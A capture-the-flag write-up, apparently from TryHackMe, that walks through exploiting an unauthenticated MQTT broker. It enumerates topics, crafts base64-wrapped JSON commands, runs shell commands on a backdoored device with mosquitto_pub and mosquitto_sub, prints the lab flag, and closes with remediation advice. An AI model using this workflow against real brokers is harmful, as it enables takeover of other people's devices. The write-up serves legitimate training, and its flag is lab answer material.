```markdown
# Bugged — IoT MQTT Exploitation Write-Up  
**Author:** Mohammad Meraj  
**Platform:** TryHackMe  
**Date:** 10-12-2025  

---

# Overview

This room introduced a vulnerable IoT environment using an unsecured MQTT broker.  
Through reconnaissance and topic enumeration, I discovered a backdoored device, decoded its command structure, crafted base64-wrapped payloads, and executed system commands remotely through MQTT publish/subscribe channels.

The attack chain demonstrates how insecure message brokers can lead to **full system compromise**.

---

# PHASE 1: RECONNAISSANCE

### Initial Port Scan
A standard Nmap scan was performed to identify open services:

- SSH (22)
- MQTT (1883)

Images/Screenshot 2025-12-10 103839.png

The MQTT port was the primary target for IoT communication analysis.

---

# PHASE 2: TOOL SETUP

Installed MQTT client tools:

```

sudo apt install mosquitto-clients

````

Tools used:
- `mosquitto_sub` — subscribe to topics  
- `mosquitto_pub` — publish crafted messages  

---

# PHASE 3: ENUMERATION

### Subscribing to MQTT Traffic  
Subscribing to wildcard topics revealed unprotected IoT traffic.  
A critical JSON structure appeared in the broker stream:

```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "registered_commands": ["HELP", "CMD", "SYS"],
  "pub_topic": "U4vyqNLQtf/OvozmaZyLT/1SH9TF6CHg/pub",
  "sub_topic": "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
}
````

### Key Findings

* Device exposes **3 remote commands**: HELP, CMD, SYS
* Commands must be sent to its **pub_topic**
* Responses arrive via its **sub_topic**
* Messages must be **base64-encoded JSON objects**

This was the core discovery enabling exploitation.

---

# PHASE 4: INITIAL TESTING & ERRORS

Attempts to send a plaintext JSON command resulted in:

```
KEY ERROR: "Invalid message format. Format: base64(...)"
```

This confirmed the device **only accepts base64-wrapped JSON commands**.

Further testing validated the expected structure:

```json
{
  "id": "<device-id>",
  "cmd": "CMD",
  "arg": "<command>"
}
```

---

# PHASE 5: EXPLOITATION WORKFLOW

## 1. Crafting the JSON Payload

Example for executing `ls`:

```json
{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}
```

## 2. Encoding in Base64

Using CyberChef, the JSON was encoded into a single base64 string.

## 3. Publishing to the Backdoor Device

```
mosquitto_pub -t "U4vyqNLQtf/OvozmaZyLT/1SH9TF6CHg/pub" -m "<base64-payload>"
```

## 4. Listening for the Response

```
mosquitto_sub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"
```

---

# PHASE 6: COMMAND EXECUTION

### Running `ls`

Device Response (after decoding):

```
flag.txt
```

### Running `cat flag.txt`

This command was encoded, published, and the resulting base64 output was captured via the subscription channel.

Decoded JSON response:

```json
{
  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",
  "response": "flag{18d44fc0707ac8dc8be45bb83db54013}\n"
}
```

---

# FINAL FLAG

```
flag{18d44fc0707ac8dc8be45bb83db54013}
```

---

# Risk Rating

**Severity:** HIGH
**Impact:** Full device takeover
**Vector:** Unauthenticated MQTT message broker
**Consequence:**

* Remote command execution
* Arbitrary file read
* Device manipulation
* Potential network pivoting

---

# Remediation

1. **Enable MQTT Authentication**
   Require username/password for all broker connections.

2. **Enforce TLS Encryption (MQTT over SSL/TLS)**
   Prevents interception and tampering.

3. **Disable Anonymous Access**
   Reject all unauthenticated publish/subscribe attempts.

4. **Implement Topic Authorization**
   Restrict devices to specific pub/sub topics.

5. **Validate Message Format Server-Side**
   Reject unexpected commands, IDs, or structures.

---

# Conclusion

This room was my first hands-on exposure to IoT exploitation and MQTT-based command channels.
It taught me how insecure device messaging can be hijacked to gain full system control.

This methodology mirrors **real-world IoT pentesting**, where misconfigured message brokers are one of the most common and damaging vulnerabilities.

```
```
